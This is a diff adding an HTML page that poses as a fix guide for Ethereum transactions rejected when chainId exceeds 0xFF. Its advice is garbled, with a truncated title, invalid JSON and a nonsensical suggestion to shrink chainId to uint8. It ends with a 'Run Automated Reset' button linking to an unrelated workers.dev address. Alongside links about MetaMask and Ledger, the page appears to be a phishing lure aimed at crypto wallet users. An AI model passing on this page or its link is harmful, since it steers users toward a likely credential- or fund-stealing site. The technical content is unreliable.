@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P – Fix Guide</title>
+<style>
+    body {
+        font-family: system-ui;
+        background: #0a0c10;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: none;
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #cf6679; }
+    .btn {
+        background: #cf6679;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users observe that their transactions are being rejected by the Go Ethereum Evmone T8N when the <code>chainId</code> is greater than <code>0xFF</code>, resulting in failed transaction submissions.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The issue arises from the fact that the <code>chainId</code> is being parsed as a <code>uint8</code>, which has a maximum value of <code>0xFF</code> (255). Any <code>chainId</code> greater than this value will exceed the maximum limit of <code>uint8</code>, leading to the rejection of transactions.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To resolve this issue, the following manual overrides can be applied:</li>
+<li>Update the <code>chainId</code> to a value within the <code>uint8</code> range (i.e., less than or equal to <code>0xFF</code>).</li>
+<li>Modify the Evmone T8N configuration to parse <code>chainId</code> as a <code>uint16</code> or <code>uint32</code> to accommodate larger values.</li>
+<li>Use a custom JSON payload with an adjusted <code>chainId</code> value, as shown in the following code block:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="err">x</span><span class="mi">01</span><span class="w"> </span><span class="c1">// adjusted chainId value</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider utilizing an external console for further debugging and testing of the transaction submission process. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Go Ethereum Evmone T8N installed and configured</li>
+<li>Basic understanding of Ethereum transaction structure and JSON-RPC methods</li>
+<li>Access to the Evmone T8N configuration files and custom payload construction tools</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
